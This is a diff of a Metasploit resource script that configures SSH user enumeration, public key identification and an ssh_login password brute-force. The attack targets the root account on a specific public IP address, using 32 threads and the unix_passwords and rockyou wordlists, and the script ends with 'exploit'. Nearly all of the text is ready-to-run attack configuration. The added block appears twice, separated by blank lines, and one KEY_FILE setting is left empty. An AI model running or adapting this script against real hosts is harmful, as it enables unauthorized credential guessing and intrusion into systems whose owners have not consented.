@@ -1,11 +1,60 @@
 set verbose true
-set STOP_ON_SUCCESS true
 
-use scanner/ssh/ssh_enumusers
+set STOP_ON_SUCCESS true
+set THREADS 32
+set BRUTEFORCE_SPEED 5
+set VERBOSE true
+set ANONYMOUS_LOGIN true
+set USERNAME root
+set RHOSTS 77.90.185.90
+
+use scanner/ssh/ssh_version
 use scanner/ssh/ssh_identify_pubkeys
+
+set KEY_FILE /root/.msf3/root.pub
+
 use auxiliary/scanner/ssh/ssh_login
 
-set RHOSTS 77.90.185.90
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+exploit
+
 set PASS_FILE /usr/share/wordlists/rockyou.txt
 
-set USERNAME msfadmin
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+set verbose true
+
+set STOP_ON_SUCCESS true
+
+use auxiliary/scanner/ssh/ssh_login
+use scanner/ssh/ssh_enumusers
+use scanner/ssh/ssh_identify_pubkeys
+
+set ANONYMOUS_LOGIN true
+set BRUTEFORCE_SPEED 5
+set KEY_FILE
+set THREADS 32
+set VERBOSE true
+
+set USERNAME root
+set RHOSTS 77.90.185.90
+
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+
+exploit
